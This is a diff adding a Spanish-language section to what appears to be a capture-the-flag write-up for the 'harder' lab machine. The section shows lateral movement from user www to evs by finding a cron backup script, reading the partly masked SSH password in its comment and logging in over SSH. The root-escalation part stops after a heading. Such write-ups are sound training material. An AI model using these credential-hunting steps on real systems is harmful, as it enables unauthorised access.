@@ -315,6 +315,48 @@ Cuando ejecutamos la reverse shell nos da un error, indicandonos que no encuentr
  	cat /home/evs/user.txt
 	FLAG[---user.txt---]
 
+## Post Explotacion Escalada de privilegios usuario www to evs.
+
+Despues de un buen rato enumerando y buscando, encontramos un script perteneniente al usuario www.
+
+	find / -user www 2>/dev/null
+
+		/etc/periodic/15min/evs-backup.sh
+
+Bingo el script trae sorpresa credenciales para conectarnos por ssh  con el usuario evs
+
+	cat /etc/periodic/15min/evs-backup.sh
+	#!/bin/ash
+	
+	# ToDo: create a backup script, that saves the /www directory to our internal server
+	# for authentication use ssh with user "evs" and password "U6j1brxGqbsU-------uIodnb$SZB4$bw14"
+
+ Mediante las estas credenciales podemos realizar un movimiento lateral del usuario www a evs, el cual tiene mayores privilegios en la maquina.
+ Nos logueamos en el servico ssh puerto 22 que encontramos en la enumeracion de puertos
+ 
+	┌──(root㉿kali)-[/home/kali]
+	└─# ssh evs@shell.harder.local
+	evs@shell.harder.local's password: 
+	Welcome to Alpine!
+	
+	The Alpine Wiki contains a large amount of how-to guides and general
+	information about administrating Alpine systems.
+	See <http://wiki.alpinelinux.org/>.
+	
+	You can setup the system with the command: setup-alpine
+	
+	You may change this message by editing /etc/motd.
+	
+	harder:~$ whoami
+	evs
+
+## Post Explotacion Escalada de privilegios usuario evs to root.
+
+Existen dos metodos para llegar a ser root desde el usuario evs.
+
+Metodo 1:
+
+
 
  
 
